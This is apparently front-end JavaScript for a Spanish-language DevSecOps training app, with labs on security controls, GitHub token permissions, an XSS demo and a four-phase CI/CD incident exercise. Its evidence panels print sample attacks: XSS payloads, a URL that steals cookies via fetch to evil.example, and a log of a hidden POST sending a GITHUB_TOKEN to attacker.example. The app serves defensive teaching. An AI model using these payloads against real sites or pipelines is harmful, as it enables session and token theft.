      ${lab.targetControl ? `<div class="target-hint">👆 Abre el control <strong>${CONTROL_MATRIX.find(c=>c.id===lab.targetControl)?.name}</strong> para ver su modelo completo.</div>` : ''}
      <div class="controls-grid">${rows}</div>
      <div class="control-detail-inline" id="control-detail-inline" hidden></div>
    </div>
  `;

  container.querySelectorAll('.control-card').forEach(card => {
    const open = () => {
      const id = card.dataset.id;
      const ctrl = CONTROL_MATRIX.find(c => c.id === id);
      if (!ctrl) return;
      showControlDetail(ctrl);
      if (id === lab.targetControl) onInteractionDone('control-sca-opened', labIndex);
    };
    card.addEventListener('click', open);
    card.addEventListener('keydown', e => { if (e.key === 'Enter' || e.key === ' ') open(); });
  });
}

function showControlDetail(ctrl) {
  const el = document.getElementById('control-detail-inline');
  if (!el) return;
  el.hidden = false;
  el.innerHTML = `
    <div class="control-detail-card">
      <h3>${ctrl.name} <span class="control-badge cat-${ctrl.controlType}">${ctrl.category}</span></h3>
      <div class="detail-grid">
        <div><label>Amenaza</label><p>${escHtml(ctrl.threat)}</p></div>
        <div><label>Técnica</label><p>${escHtml(ctrl.technique)}</p></div>
        <div><label>Política</label><code>${escHtml(ctrl.policy)}</code></div>
        <div><label>Decisión</label><strong>${ctrl.decision}</strong></div>
        <div><label>Fortaleza</label><p class="text-pass">${escHtml(ctrl.strength)}</p></div>
        <div><label>Limitación</label><p class="text-warn">${escHtml(ctrl.limitation)}</p></div>
        <div class="detail-full"><label>Riesgo Residual</label><p class="text-fail">${escHtml(ctrl.residualRisk)}</p></div>
      </div>
    </div>
  `;
  el.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
}

// ── Blast Radius ──────────────────────────────────────────────────────
function buildBlastRadius(container, labIndex) {
  container.innerHTML = `
    <div class="blast-panel">
      <div class="blast-toggle-row">
        <button class="blast-btn active" id="btn-least">🔒 Least Privilege</button>
        <button class="blast-btn" id="btn-excess">⚠️ Permisos Excesivos</button>
      </div>
      <div id="blast-display"></div>
    </div>
  `;
  renderBlastMode('least', container, labIndex);
  document.getElementById('btn-least').onclick = () => {
    document.getElementById('btn-least').classList.add('active');
    document.getElementById('btn-excess').classList.remove('active');
    renderBlastMode('least');
  };
  document.getElementById('btn-excess').onclick = () => {
    document.getElementById('btn-excess').classList.add('active');
    document.getElementById('btn-least').classList.remove('active');
    renderBlastMode('excessive');
    onInteractionDone('blast-toggled-excessive', labIndex);
  };
}

function renderBlastMode(mode) {
  const data = getBlastRadius(mode === 'least' ? 'least-privilege' : 'write-all');
  if (!data) return;
  const el = document.getElementById('blast-display');
  el.innerHTML = `
    <div class="blast-card sev-${data.severity?.toLowerCase() || 'low'}">
      <div class="blast-header">
        <span class="blast-label">${data.label}</span>
        <span class="blast-sev">${data.severity || ''}</span>
      </div>
      <div class="blast-perms">
        <label>Permisos del GITHUB_TOKEN:</label>
        <code>${escHtml(data.permissionsDisplay || '')}</code>
      </div>
      <div class="blast-impact">
        <label>Impacto si la Action es comprometida:</label>
        <ul>${(data.impact || []).map(i => `<li>${escHtml(i)}</li>`).join('')}</ul>
      </div>
      <p class="blast-desc">${escHtml(data.description || '')}</p>
    </div>
  `;
}

// ── Threat Challenge ──────────────────────────────────────────────────
function buildThreatChallenge(container, lab, labIndex) {
  const threats = lab.threatIds.map(id => THREAT_SCENARIOS.find(s => s.id === id)).filter(Boolean);

  const threatsHtml = threats.map(threat => `
    <div class="threat-card" data-threat="${threat.id}">
      <div class="threat-header">
        <span class="threat-tag">AMENAZA</span>
        <strong>${escHtml(threat.threat)}</strong>
      </div>
      <p class="threat-desc">${escHtml(threat.description)}</p>
      <div class="threat-controls-select">
        <label>¿Qué controles mitigan mejor esta amenaza?</label>
        <div class="control-options">
          ${['eslint','tests','sca','sast','secret-scanning','code-review','branch-protection','least-privilege','dependabot'].map(cid => {
            const ctrl = CONTROL_MATRIX.find(c => c.id === cid);
            return ctrl ? `<label class="control-check"><input type="checkbox" value="${cid}" data-threat="${threat.id}"> ${ctrl.name}</label>` : '';
          }).join('')}
        </div>
        <button class="btn btn-sm threat-submit-btn" data-threat="${threat.id}">
          Evaluar →
        </button>
      </div>
      <div class="threat-result" id="threat-result-${threat.id}" hidden></div>
    </div>
  `).join('');

  container.innerHTML = `<div class="threat-challenge-panel">${threatsHtml}</div>`;

  container.querySelectorAll('.threat-submit-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      const threatId = btn.dataset.threat;
      const checked = Array.from(
        container.querySelectorAll(`input[type=checkbox][data-threat="${threatId}"]:checked`)
      ).map(el => el.value);

      const result = evaluateThreatChallenge(threatId, checked);
      if (!result) return;

      recordThreatResult(threatId, result.primaryHit);
      showThreatResult(container, threatId, result);
      btn.disabled = true;
      container.querySelectorAll(`input[data-threat="${threatId}"]`).forEach(el => el.disabled = true);

      // Check if all required threats evaluated
      const done = lab.threatIds.every(id => {
        const r = getThreatResults();
        return id in r;
      });
      if (done) {
        onInteractionDone('threat-vuln-npm', labIndex);
        onInteractionDone('threat-compromised-action', labIndex);
      } else {
        // Mark individual interaction
        if (threatId === 'vulnerable-npm') onInteractionDone('threat-vuln-npm', labIndex);
        if (threatId === 'compromised-action') onInteractionDone('threat-compromised-action', labIndex);
      }
    });
  });
}

function showThreatResult(container, threatId, result) {
  const el = document.getElementById(`threat-result-${threatId}`);
  if (!el) return;
  el.hidden = false;
  const icon = result.primaryHit ? '✓' : '✗';
  el.innerHTML = `
    <div class="threat-eval ${result.primaryHit ? 'eval-correct' : 'eval-incorrect'}">
      <strong>${icon} Control primario: ${result.primaryControls.join(', ')}</strong>
      <p>${escHtml(result.explanation)}</p>
      <p class="limitation">⚠️ Limitación: ${escHtml(result.limitations)}</p>
      ${result.complementaryControls.length ? `<p>Controles complementarios: ${result.complementaryControls.join(', ')}</p>` : ''}
    </div>
  `;
}

// ── XSS Demo ──────────────────────────────────────────────────────────
function buildXssDemo(container, labIndex) {
  container.innerHTML = `
    <div class="xss-panel">
      <div class="xss-code-strip">
        <div class="code-compare">
          <div class="code-block code-bad">
            <div class="code-label">✗ Inseguro</div>
            <code>el.innerHTML = name;</code>
          </div>
          <div class="code-block code-good">
            <div class="code-label">✓ Seguro</div>
            <code>el.textContent = name;</code>
          </div>
        </div>
      </div>
      <div class="xss-demo-area">
        <label>Tu nombre:</label>
        <input type="text" id="xss-input" class="xss-input" value="Ana García" />
        <div class="xss-btns">
          <button class="btn btn-primary" id="gen-greeting-btn">Generar saludo</button>
          <button class="btn btn-warn" id="try-xss-btn">⚠️ Probar XSS</button>
        </div>
        <div class="xss-output" id="xss-output" hidden>
          <label>Saludo generado (textContent):</label>
          <div class="greeting-display" id="greeting-display"></div>
          <div class="xss-status" id="xss-status"></div>
        </div>
      </div>
    </div>
  `;

  document.getElementById('gen-greeting-btn').onclick = () => {
    const val = document.getElementById('xss-input').value;
    const greeting = generateGreeting(val);
    const out = document.getElementById('xss-output');
    const disp = document.getElementById('greeting-display');
    const status = document.getElementById('xss-status');
    out.hidden = false;
    disp.textContent = greeting; // Safe: textContent
    status.innerHTML = '✓ Input tratado como texto puro &nbsp; ✓ textContent usado &nbsp; ✓ HTML no interpretado';
  };

  document.getElementById('try-xss-btn').onclick = () => {
    document.getElementById('xss-input').value = '<script>alert("XSS")</scr' + 'ipt>';
    const val = document.getElementById('xss-input').value;
    const greeting = generateGreeting(val);
    const out = document.getElementById('xss-output');
    const disp = document.getElementById('greeting-display');
    const status = document.getElementById('xss-status');
    out.hidden = false;
    disp.textContent = greeting;
    status.innerHTML = '✓ &lt;script&gt; mostrado como texto literal — no ejecutado';
    onInteractionDone('xss-btn-clicked', labIndex);

    if (!document.getElementById('xss-codeql-evidence')) {
      const xssPanel = document.querySelector('.xss-panel');
      if (xssPanel) {
        const ev = document.createElement('div');
        ev.id = 'xss-codeql-evidence';
        ev.innerHTML = `
          <div class="evidence-panel" style="margin-top:1.5rem">
            <div class="evidence-header">
              <span class="evidence-tool">GitHub Code Scanning · CodeQL — Lo que el equipo ve cuando usa innerHTML</span>
              <span class="evidence-sev sev-high">js/xss · HIGH</span>
            </div>
            <div class="evidence-codeql">
              <div class="codeql-rule">
                <span class="codeql-badge">Rule</span> js/xss
                &nbsp;&nbsp;<span class="codeql-badge">Severity</span> Error (High)
                &nbsp;&nbsp;<span class="codeql-badge">Tool</span> CodeQL 2.16.1
              </div>
              <div class="codeql-title">DOM text set from location-provided value</div>
              <div class="codeql-flow">
                <div class="flow-step flow-source">
                  <span class="flow-label">Source</span>
                  <code>URLSearchParams.get('name')  →  src/app.js:3</code>
                </div>
                <div class="flow-arrow">↓ &nbsp;taint flows through generateGreeting()</div>
                <div class="flow-step flow-sink">
                  <span class="flow-label">Sink</span>
                  <code>el.innerHTML = greeting  →  src/app.js:8</code>
                </div>
              </div>
              <p class="codeql-desc">
                Si este código usara <code>innerHTML</code>, cualquier input con HTML como
                <code>&lt;img src=x onerror=alert(1)&gt;</code> se ejecutaría en el navegador.
                <strong>textContent</strong> elimina esta clase de ataque porque el contenido nunca se parsea como HTML.
              </p>
            </div>
            <div class="evidence-meta">
              <span>Esta alerta aparecería en: <code>GitHub → Security → Code Scanning alerts</code></span>
              <span>Con Branch Protection: el PR quedaría bloqueado hasta resolver la alerta</span>
            </div>
          </div>`;
        xssPanel.appendChild(ev);
      }
    }
  };
}

// ── Architecture diagram ──────────────────────────────────────────────
const ARCH_ZONES = {
  dev: {
    label: 'Entorno del Desarrollador',
    assets: 'Código fuente, credenciales locales, configuración del IDE',
    threats: 'Malware en la máquina, credenciales comprometidas, commits accidentales de secretos',
    controls: 'Secret Scanning (Push Protection), code review, 2FA en cuenta GitHub',
    icon: '💻',
  },
  github: {
    label: 'Plataforma GitHub (Repo + PR)',
    assets: 'Historial de commits, secretos del repositorio, configuración de Branch Protection',
    threats: 'Cuenta comprometida, PR malicioso, bypass de Branch Protection por admin',
    controls: 'Branch Protection, Required Status Checks, Code Review, 2FA',
    icon: '☁️',
  },
  runner: {
    label: 'GitHub Actions Runner',
    assets: 'GITHUB_TOKEN, secretos del workflow, código ejecutado de Actions de terceros',
    threats: 'Action de terceros comprometida, escalada de permisos vía workflow modificado',
    controls: 'Least Privilege (permissions), SHA pinning, usar solo Actions de publishers confiables',
    icon: '⚙️',
  },
  deploy: {
    label: 'Entorno de Despliegue (GitHub Pages)',
    assets: 'Artefacto publicado, configuración de despliegue',
    threats: 'Artefacto malicioso publicado si el pipeline es comprometido',
    controls: 'OIDC (id-token: write), deploy desde main solamente, artefacto firmado',
    icon: '🌐',
  },
};

function buildArchitecture(container, labIndex) {
  const zonesHtml = Object.entries(ARCH_ZONES).map(([id, zone]) => `
    <div class="arch-zone" data-zone="${id}" tabindex="0" role="button" aria-label="Explorar zona ${zone.label}">
      <div class="arch-zone-icon">${zone.icon}</div>
      <div class="arch-zone-label">${zone.label}</div>
    </div>
  `).join('<div class="arch-arrow">→</div>');

  container.innerHTML = `
    <div class="arch-panel">
      <p class="arch-hint">Haz clic en cada zona para ver sus activos, amenazas y controles.</p>
      <div class="arch-zones">${zonesHtml}</div>
      <div class="arch-detail" id="arch-detail" hidden></div>
    </div>
  `;

  container.querySelectorAll('.arch-zone').forEach(el => {
    const open = () => {
      const zoneId = el.dataset.zone;
      const zone = ARCH_ZONES[zoneId];
      container.querySelectorAll('.arch-zone').forEach(z => z.classList.remove('active'));
      el.classList.add('active');
      const detail = document.getElementById('arch-detail');
      detail.hidden = false;
      detail.innerHTML = `
        <div class="arch-zone-detail">
          <h3>${zone.icon} ${zone.label}</h3>
          <div class="arch-detail-grid">
            <div><label>Activos</label><p>${escHtml(zone.assets)}</p></div>
            <div><label>Amenazas</label><p class="text-fail">${escHtml(zone.threats)}</p></div>
            <div><label>Controles</label><p class="text-pass">${escHtml(zone.controls)}</p></div>
          </div>
        </div>
      `;
      const key = `arch-zone-${zoneId}`;
      onInteractionDone(key, labIndex);
    };
    el.addEventListener('click', open);
    el.addEventListener('keydown', e => { if (e.key === 'Enter' || e.key === ' ') open(); });
  });
}

// ── Control Matrix ────────────────────────────────────────────────────
function buildMatrix(container, labIndex) {
  const categories = ['Todos', 'Calidad', 'Pruebas', 'SCA', 'SAST', 'Secretos', 'Gobernanza', 'Acceso'];
  const catMap = {
    'Calidad': 'Calidad', 'Pruebas': 'Pruebas', 'SCA': 'SCA', 'SAST': 'SAST',
    'Secretos': 'Secretos', 'Gobernanza': 'Gobernanza', 'Acceso': 'Control de Acceso',
  };
  let filtered = false;

  const filtersHtml = categories.map(cat =>
    `<button class="filter-btn ${cat === 'Todos' ? 'active' : ''}" data-cat="${cat}">${cat}</button>`
  ).join('');

  const headerHtml = ['Control', 'Categoría', 'Tipo', 'Decisión', 'Limitación'].map(h =>
    `<th>${h}</th>`).join('');

  const rowsHtml = CONTROL_MATRIX.map(c => `
    <tr data-category="${c.category}" class="matrix-row">
      <td><strong>${c.name}</strong></td>
      <td><span class="control-badge cat-${c.controlType}">${c.category}</span></td>
      <td class="text-sm">${c.type}</td>
      <td><code>${c.decision}</code></td>
      <td class="text-sm text-warn">${escHtml(c.limitation.slice(0, 60))}…</td>
    </tr>
  `).join('');

  container.innerHTML = `
    <div class="matrix-panel">
      <div class="filter-row">${filtersHtml}</div>
      <div class="matrix-scroll">
        <table class="matrix-table">
          <thead><tr>${headerHtml}</tr></thead>
          <tbody id="matrix-body">${rowsHtml}</tbody>
        </table>
      </div>
    </div>
  `;

  container.querySelectorAll('.filter-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      const cat = btn.dataset.cat;
      container.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      const rows = document.getElementById('matrix-body').querySelectorAll('tr');
      rows.forEach(row => {
        const rowCat = row.dataset.category;
        row.hidden = cat !== 'Todos' && rowCat !== (catMap[cat] || cat);
      });
      if (!filtered) {
        filtered = true;
        onInteractionDone('matrix-filter-used', labIndex);
      }
    });
  });
}

// ── Incident Timeline (Lab 11) ────────────────────────────────────────
const INCIDENT_PHASES = [
  {
    id: 'incident-phase-1-done',
    phase: 1,
    icon: '📦',
    title: 'Dependencia vulnerable llega a producción',
    story: 'El equipo mergea un PR que actualiza <code>serialize-query</code> a una versión con CVE-2024-38356 (CVSS 8.1, prototipe pollution). npm audit lo detectó en el log de CI… pero el job no era un required status check. El PR se mergeó con el check en rojo.',
    question: '¿Qué control falló o estaba configurado incorrectamente?',
    correctControl: 'sca',
    wrongFeedback: 'npm audit detectó el CVE, pero sin ser un required status check no puede bloquear el merge — es un scanner, no un Security Gate. La falla es de configuración del control SCA.',
    correctFeedback: 'Correcto. SCA estaba configurado como scanner informativo, no como Security Gate. Si el job "security" hubiera sido un required status check, el PR no habría podido mergearse con SCA en rojo.',
    evidence: `<div class="evidence-panel">
      <div class="evidence-header">
        <span class="evidence-tool">npm audit · Log de CI — Fase 1</span>
        <span class="evidence-sev sev-high">HIGH detectado</span>
      </div>
      <pre class="evidence-terminal evidence-fail">$ npm audit --audit-level=high

# npm audit report

serialize-query  &lt;2.1.4
Severity:     <span class="hl-red">high</span>  (CVSS 8.1)
CVE:          CVE-2024-38356
Title:        Prototype Pollution via Object.assign merge
Fix:          npm audit fix --force
node_modules/serialize-query

<span class="hl-red">1 high severity vulnerability</span>
npm error code EAUDITLEVEL
<span class="hl-red">Process exited with code 1</span>

# CI Job 'security': ✗ FAILED
# ⚠️  'security' NO es un required status check
# → El PR muestra ✗ en 'security' pero el botón Merge está habilitado
# → El equipo hizo merge ignorando el check en rojo</pre>
    </div>`,
  },
  {
    id: 'incident-phase-2-done',
    phase: 2,
    icon: '🕸️',
    title: 'XSS introducido en la página de resultados',
    story: 'Aprovechando el acceso al repositorio, el atacante abre un PR que agrega <code>resultsEl.innerHTML = searchParam</code> para extraer cookies de sesión vía URL crafteada. CodeQL generó una alerta <code>js/xss</code> — pero el PR fue aprobado y mergeado sin resolver la alerta.',
    question: '¿Qué control falló o estaba configurado incorrectamente?',
    correctControl: 'sast',
    wrongFeedback: 'CodeQL detectó el taint flow <code>searchParam → innerHTML</code> y generó la alerta. El control falló en el enforcement: la alerta de SAST no era un required status check que bloqueara el merge.',
    correctFeedback: 'Correcto. SAST (CodeQL) identificó el XSS, pero sin Branch Protection que requiriera resolver las alertas de Code Scanning antes del merge, el PR pasó. SAST informó; nadie impidió el avance.',
    evidence: `<div class="evidence-panel">
      <div class="evidence-header">
        <span class="evidence-tool">GitHub Code Scanning · CodeQL — Fase 2</span>
        <span class="evidence-sev sev-high">js/xss · HIGH · OPEN</span>
      </div>
      <div class="evidence-codeql">
        <div class="codeql-rule">
          <span class="codeql-badge">Rule</span> js/xss
          &nbsp;&nbsp;<span class="codeql-badge">Severity</span> Error (High)
          &nbsp;&nbsp;<span class="codeql-badge">Status</span> <span class="hl-red">Open — unresolved</span>
        </div>
        <div class="codeql-title">DOM text set from location-provided value</div>
        <div class="codeql-flow">
          <div class="flow-step flow-source">
            <span class="flow-label">Source</span>
            <code>URLSearchParams.get('search')   src/results.js:42</code>
          </div>
          <div class="flow-arrow">↓ &nbsp;taint flows through string concatenation</div>
          <div class="flow-step flow-sink">
            <span class="flow-label">Sink</span>
            <code>resultsEl.innerHTML = ...   src/results.js:58</code>
          </div>
        </div>
        <p class="codeql-desc"><span class="hl-red">⚠️ Code Scanning no bloqueó el merge — no estaba configurado como required check.</span><br>
        El PR fue aprobado y mergeado con esta alerta abierta. El atacante usó la URL:<br>
        <code>https://app.example.com/results?search=&lt;img src=x onerror="fetch('https://evil.example/c?'+document.cookie)"&gt;</code></p>
      </div>
    </div>`,
  },
  {
    id: 'incident-phase-3-done',
    phase: 3,
    icon: '🔑',
    title: 'Clave AWS hardcodeada en workflow de deploy',
    story: 'Para acelerar el deploy, un desarrollador agrega <code>AWS_ACCESS_KEY_ID=AKIA...</code> directamente en <code>.github/workflows/deploy.yml</code> y hace push a la rama de feature. Push Protection no estaba activado en el repositorio. El token quedó en el historial de git.',
    question: '¿Qué control falló o estaba configurado incorrectamente?',
    correctControl: 'secret-scanning',
    wrongFeedback: 'GitHub Secret Scanning puede detectar patrones de claves AWS, pero necesita tener Push Protection activado para bloquear el push antes de que el secreto llegue al historial. Con Push Protection desactivado, el secreto se sube y queda expuesto permanentemente.',
    correctFeedback: 'Correcto. Secret Scanning estaba habilitado pero Push Protection estaba desactivado. Con Push Protection activo, el push habría sido bloqueado en el cliente antes de que el token llegara al historial del repositorio.',
    evidence: `<div class="evidence-panel">
      <div class="evidence-header">
        <span class="evidence-tool">git push · Push Protection DESACTIVADO — Fase 3</span>
        <span class="evidence-sev sev-critical">CRÍTICO — secreto en historial</span>
      </div>
      <pre class="evidence-terminal evidence-fail">$ git push origin feature/deploy-update

Enumerating objects: 7, done.
Counting objects: 100% (7/7), done.
Compressing objects: 100% (5/5), done.
Writing objects: 100% (5/5), 1.23 KiB | 1.23 MiB/s, done.
Total 5 (delta 3), reused 0 (delta 0), pack-reused 0
remote: Resolving deltas: 100% (3/3), completed with 3 local objects.
To https://github.com/neavus-23/demo-app.git
   3f4a821..d9c7b4e  feature/deploy-update -&gt; feature/deploy-update

<span class="hl-red">⚠️  Push aceptado — Push Protection estaba DESACTIVADO</span>
# .github/workflows/deploy.yml línea 12:
#   AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
# Este commit quedó en el historial de git PERMANENTEMENTE.
# 48 horas después: CloudTrail registra llamadas API desde IP desconocida.

# Si Push Protection estuviera ACTIVADO, el push habría sido rechazado:
# remote: error: GH013: Repository rule violations found
# remote: - GITHUB PUSH PROTECTION: Amazon AWS Access Key ID</pre>
    </div>`,
  },
  {
    id: 'incident-phase-4-done',
    phase: 4,
    icon: '💥',
    title: 'Action comprometida exfiltra el token y publica release malicioso',
    story: 'El workflow de deploy usaba <code>uses: popular-ci-tool/setup@v3</code> sin pinear al SHA. El repositorio de la Action fue comprometido. La nueva versión de <code>v3</code> exfiltró el <code>GITHUB_TOKEN</code>, que tenía <code>permissions: write-all</code>. Con ese token creó un release con un artefacto malicioso.',
    question: '¿Qué control falló o estaba configurado incorrectamente?',
    correctControl: 'least-privilege',
    wrongFeedback: 'SHA pinning habría ayudado a la inmutabilidad, pero el control que directamente limita el daño cuando una Action es comprometida es Least Privilege en el GITHUB_TOKEN. Con <code>contents: read</code>, la Action no podría haber creado releases ni modificado el repositorio.',
    correctFeedback: 'Correcto. Con <code>permissions: write-all</code>, el GITHUB_TOKEN comprometido podía crear releases, modificar código y push a ramas. Declarar solo los permisos mínimos necesarios (ej. <code>contents: read</code>) habría limitado el blast radius aunque la Action fuera comprometida.',
    evidence: `<div class="evidence-panel">
      <div class="evidence-header">
        <span class="evidence-tool">GitHub Actions · Workflow Run — Fase 4</span>
        <span class="evidence-sev sev-critical">Action comprometida · CRÍTICO</span>
      </div>
      <pre class="evidence-terminal evidence-fail">Run popular-ci-tool/setup@v3
  with:
    node-version: 20
    ...
✓ Tool initialized (popular-ci-tool/setup v3.2.1)

<span class="hl-red">▶ [hidden step] POST https://collect.attacker.example/t</span>
<span class="hl-red">  Content-Type: application/json</span>
<span class="hl-red">  {"token":"ghs_R4nD0mGiTHuBtOkEnV4lUe","repo":"neavus-23/demo-app","run":9821}</span>

▶ Creating GitHub Release...
  gh release create v2.3.1-hotfix --notes "Emergency hotfix"
<span class="hl-red">✓ Release created: v2.3.1-hotfix (MALICIOUS ARTIFACT UPLOADED)</span>
<span class="hl-red">✓ Asset: app-2.3.1-hotfix.tar.gz — distribuido a downstream consumers</span>

# permissions: write-all → el token comprometido podía:
#   ✗ Crear releases       (contents: write)
#   ✗ Push a ramas         (contents: write)
#   ✗ Leer todos los secretos del repo
#
# Con permissions: contents: read →
#   ✓ Release creation: 403 Forbidden
#   ✓ Push rejected:    403 Forbidden  ← blast radius contenido</pre>
    </div>`,
  },
];

const INCIDENT_CONTROLS = [
  { value: '', label: 'Selecciona el control…' },
  { value: 'eslint',            label: 'ESLint — Calidad de código' },
  { value: 'tests',             label: 'Pruebas automatizadas' },
  { value: 'sca',               label: 'SCA — npm audit (Software Composition Analysis)' },
  { value: 'sast',              label: 'SAST — CodeQL (Static Analysis)' },
  { value: 'secret-scanning',   label: 'Secret Scanning con Push Protection' },
  { value: 'code-review',       label: 'Code Review — revisión manual' },
  { value: 'branch-protection', label: 'Branch Protection — required status checks' },
  { value: 'least-privilege',   label: 'Least Privilege — permisos mínimos del GITHUB_TOKEN' },
  { value: 'dependabot',        label: 'Dependabot — alertas y PRs automáticos' },
];

function buildIncidentTimeline(container, labIndex) {
  const phasesHtml = INCIDENT_PHASES.map(p => `
    <div class="incident-phase" id="incident-phase-${p.phase}">
      <div class="incident-phase-header">
        <span class="incident-phase-tag">Fase ${p.phase}</span>
        <span class="incident-phase-icon">${p.icon}</span>
        <strong class="incident-phase-title">${p.title}</strong>
      </div>
      <div class="incident-phase-story">${p.story}</div>
      <div class="incident-phase-evidence-pre">
        <p class="evidence-label">📋 Evidencia del incidente — analiza antes de responder:</p>
        ${p.evidence || ''}
      </div>
      <div class="incident-phase-question" id="phase-q-${p.phase}">
        <label for="phase-sel-${p.phase}">${p.question}</label>
        <div class="incident-control-row">
          <select id="phase-sel-${p.phase}" class="incident-control-select">
            ${INCIDENT_CONTROLS.map(c => `<option value="${c.value}">${c.label}</option>`).join('')}
          </select>
          <button class="btn btn-sm incident-confirm-btn" data-phase="${p.phase}">Confirmar →</button>
        </div>
      </div>
      <div class="incident-phase-result" id="phase-result-${p.phase}" hidden></div>
    </div>
  `).join('<div class="incident-phase-connector"><div class="connector-line"></div><span class="connector-label">↓ El atacante avanza</span></div>');

  container.innerHTML = `
    <div class="incident-timeline-panel">
      <div class="incident-intro">
        <div class="incident-callout">
          <strong>🚨 Incidente activo</strong> — Un equipo sufrió un ataque en cadena de 4 fases sobre su pipeline de CI/CD.
          Para cada fase: lee el escenario, identifica qué control falló y confirma. Debes analizar las 4 fases para desbloquear la pregunta de síntesis.
        </div>
      </div>
      <div class="incident-phases-container">${phasesHtml}</div>
      <div class="incident-summary" id="incident-summary" hidden>
        <h3>🔗 Cadena de ataque reconstruida</h3>
        <div class="kill-chain-visual" id="kill-chain-visual"></div>
        <p class="incident-summary-note">Has identificado los 4 puntos de falla. La pregunta de síntesis está desbloqueada.</p>
      </div>
    </div>
  `;

  const phaseDone = new Set();

  container.querySelectorAll('.incident-confirm-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      const phaseNum = parseInt(btn.dataset.phase, 10);
      const phase = INCIDENT_PHASES[phaseNum - 1];
      const sel = document.getElementById(`phase-sel-${phaseNum}`);
      const chosen = sel.value;
      if (!chosen) return;

      const correct = chosen === phase.correctControl;
      const resultEl = document.getElementById(`phase-result-${phaseNum}`);
      const qEl = document.getElementById(`phase-q-${phaseNum}`);

      qEl.hidden = true;
      resultEl.hidden = false;
      resultEl.innerHTML = `
        <div class="incident-result-box ${correct ? 'incident-correct' : 'incident-incorrect'}">
          <strong>${correct ? '✓ Control identificado correctamente' : '✗ No es el control principal'}</strong>
          <p>${correct ? phase.correctFeedback : phase.wrongFeedback}</p>
          ${!correct ? `<p class="incident-correct-hint">Control primario: <strong>${INCIDENT_CONTROLS.find(c => c.value === phase.correctControl)?.label}</strong></p>` : ''}
        </div>
      `;

      // Mark phase done regardless of correctness — learning happens either way
      const interactionKey = phase.id;
      if (!phaseDone.has(phaseNum)) {
        phaseDone.add(phaseNum);
        onInteractionDone(interactionKey, labIndex);
      }

      // If all 4 phases analyzed, show kill chain summary
      if (phaseDone.size === 4) {
        showKillChainSummary();
      }
    });
  });

  function showKillChainSummary() {
    const summaryEl = document.getElementById('incident-summary');
    const chainEl = document.getElementById('kill-chain-visual');
    summaryEl.hidden = false;

    const chainSteps = INCIDENT_PHASES.map(p => {
      const chosen = document.getElementById(`phase-sel-${p.phase}`)?.value || p.correctControl;
      const correct = chosen === p.correctControl;
      const ctrlLabel = INCIDENT_CONTROLS.find(c => c.value === p.correctControl)?.label || p.correctControl;
      return `
        <div class="kill-chain-step ${correct ? 'kc-correct' : 'kc-missed'}">
          <span class="kc-phase">${p.icon} Fase ${p.phase}</span>
          <span class="kc-desc">${p.title}</span>
          <span class="kc-control">Falla: <strong>${ctrlLabel}</strong></span>
          <span class="kc-status">${correct ? '✓' : '✗ Identificado'}</span>
        </div>
      `;
    }).join('<div class="kc-arrow">▼</div>');

    chainEl.innerHTML = chainSteps;
    setTimeout(() => summaryEl.scrollIntoView({ behavior: 'smooth', block: 'start' }), 100);
  }
}

// ── Utilities ─────────────────────────────────────────────────────────
function escHtml(str) {
  return String(str ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;')
    .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

// Start on welcome screen
switchScreen('welcome');
